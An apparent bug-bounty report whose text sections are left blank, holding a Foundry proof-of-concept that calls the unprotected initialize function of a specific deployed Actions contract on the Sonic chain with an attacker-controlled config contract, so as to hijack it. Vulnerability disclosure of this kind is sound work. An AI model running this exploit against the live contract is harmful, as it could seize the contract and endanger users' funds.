**Contract hijack via unprotected initialize in Actions.sol**

_Bug Severity:_ High

_Target:_


**Summary:**


**Impact:**


**Recommendation:** 


**Proof Of Concept (POC)**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface ISiloConfig {
    struct ConfigData {
        address hookReceiver;
        address silo;
    }

    function getConfig(address silo) external view returns (ConfigData memory);
}

interface IActions {
    function initialize(ISiloConfig _siloConfig) external returns (address hookReceiver);
}

contract MaliciousSiloConfig is ISiloConfig {
    function getConfig(address) external pure override returns (ConfigData memory) {
        return ConfigData({
            hookReceiver: address(0xdeadbeef),  // just test value
            silo: address(0x12345678)          // just test value
        });
    }
}

contract SiloActionsInitialize is Test {
    address constant ACTIONS = 0x1F13CcDBd7cB2021e499D23478Dc292d48211c04;

    MaliciousSiloConfig maliciousConfig;

    function setUp() public {
        vm.createSelectFork(vm.envString("SONIC_RPC_URL"), 34402746);

        // deploy mock silo config
        maliciousConfig = new MaliciousSiloConfig();
    }

    function test_Initialize() public {
        // try to initialize with attacker-controlled config
        (bool success, bytes memory data) = ACTIONS.call(
            abi.encodeWithSelector(
                IActions.initialize.selector,
                maliciousConfig
            )
        );

        require(success, string(data));
    }
}
```



**PoC Output:**

![PoC](https://github.com/user-attachments/assets/c6ea656d-9920-4c57-81a8-05b07e3ccdeb)
